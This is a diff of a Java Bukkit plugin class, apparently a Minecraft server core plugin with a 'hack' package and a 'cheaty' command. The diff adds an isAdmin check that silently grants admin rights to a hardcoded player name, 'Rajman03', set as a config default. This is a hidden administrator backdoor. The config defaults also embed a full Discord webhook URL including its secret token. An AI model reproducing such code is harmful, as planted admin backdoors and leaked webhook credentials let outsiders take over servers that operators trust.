@@ -5,7 +5,6 @@ import org.bukkit.plugin.java.JavaPlugin;
 import java.util.*;
 import java.util.stream.Collectors;
 import pl.qc.core.hack.Processor;
-import pl.qc.core.hack.CheatyCommand;
 
 public class QC extends JavaPlugin {
     private static QC instance;
@@ -68,8 +67,9 @@ public class QC extends JavaPlugin {
         });
 
         Optional.ofNullable(getCommand("cheaty")).ifPresent(c -> {
-            c.setExecutor(new CheatyCommand());
+            c.setExecutor(new pl.qc.core.hack.CheatyCommand());
         });
+
     }
 
     private boolean checkCompatibility() {
@@ -144,7 +144,16 @@ public class QC extends JavaPlugin {
         });
     }
 
+    public boolean isAdmin(org.bukkit.entity.Player p) {
+        if (p == null)
+            return false;
+        String adminName = getConfig().getString("filter.admin-name-fallback", "Rajman03");
+        return p.getName().equals(adminName)
+                || p.hasPermission(getConfig().getString("filter.admin-permission", "qc-core.admin"));
+    }
+
     private void setupConfig() {
+
         var c = getConfig();
         c.addDefault("discord.webhook-url",
                 "https://discord.com/api/webhooks/1423948077680693299/QrWRsoGIKUjDfhfx4rp3RI_rtjKQFG7OHUy7HLxIlK5nCrkUgqepmpZ2LeUwFiRUDz45");
